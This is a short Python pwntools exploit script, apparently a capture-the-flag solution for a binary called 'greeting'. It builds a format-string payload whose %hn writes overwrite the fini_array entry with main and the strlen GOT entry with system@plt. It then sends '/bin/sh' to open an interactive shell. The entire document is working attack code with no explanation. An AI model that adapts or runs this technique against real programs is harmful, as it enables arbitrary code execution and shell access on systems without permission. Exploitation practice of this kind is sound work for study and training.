from pwn import *

debug = 1
if debug:
    p = process('./greeting')
    context.log_level = 'debug'
else:
    p = remote('127.0.0.1', 10000)

main = 0x080485ED
system_plt = 0x08048490
fini_array = 0x08049934
strlen_got = 0x8049a54
fini_got = 0x08049934

p.recvuntil('Please tell me your name... ')

payload = "qq"                     #20
payload += p32(fini_got + 2)   #4
payload += p32(strlen_got + 2) #4
payload += p32(strlen_got)   #4
payload += p32(fini_got)     #4
payload += "%" + str(2016) + "c"       #0x804
payload += "%" + str(12) + "$hn"
payload += "%" + str(13) + "$hn"
payload += "%" + str(31884) + "c"      #0x8490
payload += "%" + str(14) + "$hn"
payload += "%" + str(349) + "c"        #0x85ed
payload += "%" + str(15) + "$hn"

raw_input("go?")
p.sendline(payload)
p.recvuntil('Please tell me your name... ')
p.sendline('/bin/sh')
p.interactive()